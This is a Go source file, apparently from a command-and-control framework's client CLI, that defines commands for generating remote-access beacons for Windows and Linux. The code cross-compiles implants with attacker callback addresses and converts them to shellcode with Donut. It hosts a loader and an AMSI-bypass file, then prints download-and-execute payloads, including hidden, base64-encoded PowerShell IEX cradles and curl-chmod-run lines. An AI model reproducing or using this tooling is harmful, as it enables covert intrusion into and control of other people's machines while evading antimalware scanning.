package grumblecli

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"orsted/client/clientrpc"
	"os"
	"os/exec"
	"strings"
	"unicode/utf16"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"
)

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomName(n int) (string, error) {
    b := make([]byte, n)
    _, err := rand.Read(b)
    if err != nil {
        return "", err
    }

    for i := range b {
        b[i] = letters[int(b[i])%len(letters)]
    }
    return string(b), nil
}

func utf16LEBase64(s string) string {
    // Convert string → UTF-16 code units
    u16 := utf16.Encode([]rune(s))

    // Convert UTF-16 code units → little-endian bytes
    b := make([]byte, len(u16)*2)
    for i, v := range u16 {
        b[i*2] = byte(v)        // low byte
        b[i*2+1] = byte(v >> 8) // high byte
    }

    // Base64 encode
    return base64.StdEncoding.EncodeToString(b)
}

func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
	generateCmd := &grumble.Command{
		Name: "generate",
		Help: "generate beacon or implant from a given beacon",
	}

	generateBeaconCmd := &grumble.Command{
		Name: "beacon",
		Help: "generate beacon (HTTP, HTTPS, TCP or SMB _ windows only _",
		Args: func(a *grumble.Args) {
			a.String("os", "windows or linux")
			a.String("type", "http[|dll|svc] https[|dll|svc] tcp[|dll|svc] or smb[|dll|svc]")
			a.String("address", "address for http or tcp")
		},
		Flags: func(f *grumble.Flags) {
			f.Bool("n", "no-console", false, "If Specified, beacon will not have a console on windows")
			f.Bool("s", "host", false, "Host file and return a command to download and execute")
			f.String("t", "http-proxy-type", "none", "HTTP Proxy Type, can be HTTP or HTTPS")
			f.String("a", "http-proxy-address", "", "URL for example 127.0.0.1:8080")
			f.String("u", "http-proxy-username", "", "Proxy Username")
			f.String("p", "http-proxy-password", "", "Proxy Password")
		},
		Completer: func(prefix string, args []string) []string {
			var suggestions []string

			// 1. Flag completion
			flagSuggestions := []string{
				"--http-proxy-type",
				"--http-proxy-address",
				"--http-proxy-username",
				"--http-proxy-password",
				"--no-console",
				"--host",
			}

			// complete flags
			if strings.HasPrefix(prefix, "-") {
				for _, f := range flagSuggestions {
					if strings.HasPrefix(f, prefix) {
						suggestions = append(suggestions, f)
					}
				}
				return suggestions
			}

			// 2. Positional arguments (your existing logic)
			transportListLinux := []string{"http", "https", "tcp"}
			transportListWindows := []string{
				"http", "http_dll", "http_svc",
				"https", "https_dll", "https_svc",
				"tcp", "tcp_dll", "tcp_svc",
				"smb", "smb_dll", "smb_svc",
			}
			osList := []string{"windows", "linux"}

			var modulesList []string
			if len(args) == 0 {
				modulesList = osList
			}
			if len(args) == 1 {
				if args[0] == "windows" {
					modulesList = transportListWindows
				} else {
					modulesList = transportListLinux
				}
			}

			for _, moduleName := range modulesList {
				if strings.HasPrefix(moduleName, prefix) {
					suggestions = append(suggestions, moduleName)
				}
			}

			return suggestions
		},
		Run: func(c *grumble.Context) error {
			beaconType := c.Args.String("type")
			console := !c.Flags.Bool("no-console")
			switch beaconType {
			case "http", "http_dll", "http_svc", "https", "https_dll", "https_svc", "tcp", "tcp_dll", "tcp_svc",
				"smb", "smb_dll", "smb_svc":
				// supported type — proceed
			default:
				fmt.Println("unsupported beacon type")
				return nil
			}
			beaconOs := c.Args.String("os")
			if beaconOs != "windows" && beaconOs != "linux" {
				fmt.Println("Os should be windows, linux")
				return nil
			}

			beaconAddress := c.Args.String("address")

			address := strings.Split(beaconAddress, ":")
			if len(address) != 2 {
				fmt.Println("Address should be in the form IP:PORT")
				return nil
			}
			beaconIP := address[0]
			beaconPort := address[1]

			// Get Proxy Stuff
			proxyType := c.Flags.String("http-proxy-type")
			if proxyType != "http" && proxyType != "https" && proxyType != "none" {
				fmt.Println("Proxy should be http or https")
				return nil
			}

			proxyAddress := c.Flags.String("http-proxy-address")
			if proxyAddress != "" {
				proxyAddressSplit := strings.Split(proxyAddress, ":")
				if len(proxyAddressSplit) != 2 {
					fmt.Println("Proxy Address should be in the form IP:PORT")
					return nil
				}
			}

			proxyUsername := c.Flags.String("http-proxy-username")
			proxyPassword := c.Flags.String("http-proxy-password")

			ldflags := fmt.Sprintf("-s -w -X main.Targetip=%s -X main.Targetport=%s -X main.HTTPProxyType=%s -X main.HTTPProxyURL=%s -X main.HTTPProxyUsername=%s -X main.HTTPProxyPassword=%s", beaconIP, beaconPort, proxyType, proxyAddress, proxyUsername, proxyPassword)

			if !console && beaconOs == "windows" {
				ldflags += " -H=windowsgui"

			}
			mainPath := fmt.Sprintf("beacon/main_%s.go", beaconType)
			tags := fmt.Sprintf("-tags=%s", beaconType)

			cmd := exec.Command(
				"go", "build",
				"-ldflags", ldflags,
				"-trimpath",
				tags,
				mainPath,
			)

			if strings.HasSuffix(beaconType, "_dll") {
				cmd = exec.Command(
					"go", "build",
					"-ldflags", ldflags,
					"-trimpath",
					"-buildmode=c-shared",
					"-o", fmt.Sprintf("main_%s.dll", beaconType),
					tags,
					mainPath,
				)
			}

			// Set environment variables like GOOS and GOARCH
			cmd.Env = append(os.Environ(),
				fmt.Sprintf("GOOS=%s", beaconOs),
				"GOARCH=amd64",
			)

			if strings.HasSuffix(beaconType, "_dll") {
				cmd.Env = append(cmd.Env, "CGO_ENABLED=1")
				cmd.Env = append(cmd.Env, "CC=x86_64-w64-mingw32-gcc")
			}

			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr

			// Run the command
			fmt.Println(mainPath)
			err := cmd.Run()
			if err != nil {
				fmt.Println("Build failed:", err)
			}

			beaconName := "main_"+beaconType
			if beaconOs == "windows" {
				beaconName += ".exe"
			}
			fmt.Println(fmt.Sprintf("[+] Beacon Generated at %s", beaconName))

			host := c.Flags.Bool("host")
			if !host {
				return nil
			}

			randomPathName, err := randomName(6)
			if err != nil {
				fmt.Println("Error random name", err)
			}
			beaconByte, err := os.ReadFile(beaconName)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			err = clientrpc.HostFileFunc(conn, randomPathName + "/" + beaconName, beaconByte)
			if err != nil {
				fmt.Println("Error hosting file ", err.Error())
			}


			hlist,err  := clientrpc.ViewHostFileFunc(conn)
			if err != nil {
				fmt.Println("Error listing hosted file ", err.Error())
			}
			var beaconPath string
			for i := 0; i < len(hlist.GetHostlist()); i++ {
				hpath := hlist.GetHostlist()[i].Filename
				if strings.Contains(hpath, randomPathName) {
					beaconPath = hpath
					break
				}
			}
			if beaconPath == "" {
				fmt.Println("Error Occured, loader path not found")
				return nil
			}

			fmt.Println(fmt.Sprintf("Amsi bypass at %s://%s:%s%s", beaconType, beaconIP, beaconPort, beaconPath))
			

			fmt.Println("[+] Use the following payloads to download and run beacon")
			beaconURL := fmt.Sprintf("%s://%s:%s%s", beaconType, beaconIP, beaconPort, beaconPath)

			if beaconOs == "linux" {
				fmt.Println(fmt.Sprintf("curl %s -o /tmp/rudeus; chmod +x /tmp/rudeus; /tmp/rudeus", beaconURL))
				return nil
			}

			curlString := fmt.Sprintf("mkdir /temp; curl %s -o /temp/rudeus.exe; /temp/rudeus.exe", beaconURL)
			fmt.Println(curlString)

			curlStringB64 := utf16LEBase64(curlString)
			fmt.Println("powershell -nop -w hidden -e", curlStringB64)
			return nil
		},
	}

	generatePwshCmd := &grumble.Command{
		Name: "pwsh",
		Help: "generate HTTP or HTTPS beacon for windows and return powershell delivery",
		Args: func(a *grumble.Args) {
			a.String("type", "http or https")
			a.String("address", "address for http or https")
		},
		Flags: func(f *grumble.Flags) {
			f.String("a", "amsi", Conf.DefaultAmsiBypass, "Amsi Bypass file")
			f.String("t", "template", Conf.DefaultLoaderTemplate, "Loader File")
			f.Bool("n", "no-console", false, "If specified, beacon will have no console")
		},
		Completer: func(prefix string, args []string) []string {
			var suggestions []string

			transportListWindows := []string{
				"http", "https",
			}

			var modulesList []string
			if len(args) == 0 {
				modulesList = transportListWindows
			}

			for _, moduleName := range modulesList {
				if strings.HasPrefix(moduleName, prefix) {
					suggestions = append(suggestions, moduleName)
				}
			}

			return suggestions
		},
		Run: func(c *grumble.Context) error {
			amsiFile := c.Flags.String("amsi")
			loaderTemplate := c.Flags.String("template")
			console := !c.Flags.Bool("no-console")
			beaconType := c.Args.String("type")
			beaconOs := "windows"
			switch beaconType {
			case "http", "https":
				// supported type — proceed
			default:
				fmt.Println("unsupported beacon type. For pwsh only http and https are supported.")
				return nil
			}
			beaconAddress := c.Args.String("address")

			address := strings.Split(beaconAddress, ":")
			if len(address) != 2 {
				fmt.Println("Address should be in the form IP:PORT")
				return nil
			}
			beaconIP := address[0]
			beaconPort := address[1]

			ldflags := fmt.Sprintf("-s -w -X main.Targetip=%s -X main.Targetport=%s", beaconIP, beaconPort)

			if !console && beaconOs == "windows" {
				ldflags += " -H=windowsgui"

			}
			mainPath := fmt.Sprintf("beacon/main_%s.go", beaconType)
			tags := fmt.Sprintf("-tags=%s", beaconType)

			cmd := exec.Command(
				"go", "build",
				"-ldflags", ldflags,
				"-trimpath",
				tags,
				mainPath,
			)

			// Set environment variables like GOOS and GOARCH
			cmd.Env = append(os.Environ(),
				fmt.Sprintf("GOOS=%s", beaconOs),
				"GOARCH=amd64",
			)

			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr

			// Run the command
			fmt.Println(mainPath)
			err := cmd.Run()
			if err != nil {
				fmt.Println("Build failed:", err)
				return nil
			}

			fmt.Println("[+] Beacon Generated")
			fmt.Println("[+] Donutting the Beacon")
			args := []string{
				"-f", "1",
				"-m", "RunMe",
				"-x", "2",
				"-o", Conf.BeaconShellCodePath,
				"-i", "main_"+beaconType+".exe",
			}
			cmd = exec.Command(Conf.DonutPath, args...)
		    _, err = cmd.Output()
			if err != nil {
				fmt.Println("Error executing Donut command:", err)
				return nil
			}
			fmt.Println("[+] Donut Done")
			fmt.Println("[+] Hosting Loader")
			b, err := os.ReadFile(Conf.BeaconShellCodePath)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			beaconShellcodeB64 := base64.StdEncoding.EncodeToString(b)

			loaderTemplateByte, err := os.ReadFile(loaderTemplate)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			loader := string(loaderTemplateByte)
			loader = strings.Replace(loader, "SHELL_CODE_B64", beaconShellcodeB64, 1)

			loaderName, err := randomName(8)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			err = clientrpc.HostFileFunc(conn, loaderName, []byte(loader))
			if err != nil {
				fmt.Println("Error Hosting file ", err)
				return nil 
			}

			hlist, err := clientrpc.ViewHostFileFunc(conn)
			if err != nil {
				fmt.Println("Error Hosting file ", err)
				return nil 
			}

			var loaderPath string
			for i := 0; i < len(hlist.GetHostlist()); i++ {
				hpath := hlist.GetHostlist()[i].Filename
				if strings.Contains(hpath, loaderName) {
					loaderPath = hpath
					break
				}
			}
			if loaderPath == "" {
				fmt.Println("Error Occured, loader path not found")
				return nil
			}

			fmt.Println(fmt.Sprintf("Loader at %s://%s:%s%s", beaconType, beaconIP, beaconPort, loaderPath))
			
			
			fmt.Println("[+] Hosting AMSI")

			AmsiBypassByte, err := os.ReadFile(amsiFile)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			amsiName, err := randomName(8)
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			err = clientrpc.HostFileFunc(conn, loaderName+"/"+amsiName, AmsiBypassByte)
			if err != nil {
				fmt.Println("Error Hosting file ", err)
				return nil 
			}

			hlist, err = clientrpc.ViewHostFileFunc(conn)
			if err != nil {
				fmt.Println("Error Hosting file ", err)
				return nil 
			}

			var amsiPath string
			for i := 0; i < len(hlist.GetHostlist()); i++ {
				hpath := hlist.GetHostlist()[i].Filename
				if strings.Contains(hpath, amsiName) {
					amsiPath = hpath
					break
				}
			}
			if amsiPath == "" {
				fmt.Println("Error Occured, loader path not found")
				return nil
			}

			fmt.Println(fmt.Sprintf("Amsi bypass at %s://%s:%s%s", beaconType, beaconIP, beaconPort, amsiPath))
			

			fmt.Println("[+] Powershell web delivery Payload (Not Stealth but quick)")
			loaderUrl := fmt.Sprintf("%s://%s:%s%s", beaconType, beaconIP, beaconPort, loaderPath)
			amsiUrl := fmt.Sprintf("%s://%s:%s%s", beaconType, beaconIP, beaconPort, amsiPath)

			pwshWebDelivery := fmt.Sprintf("IEX ((new-object Net.WebClient).DownloadString('%s'));IEX ((new-object Net.WebClient).DownloadString('%s'));", amsiUrl, loaderUrl)

			fmt.Println(pwshWebDelivery)

			pwshWebDeliveryB64 := utf16LEBase64(pwshWebDelivery)
			fmt.Println("powershell -nop -w hidden -e", pwshWebDeliveryB64)
			return nil
		},
	}
	generateCmd.AddCommand(generateBeaconCmd)
	generateCmd.AddCommand(generatePwshCmd)
	app.AddCommand(generateCmd)
}
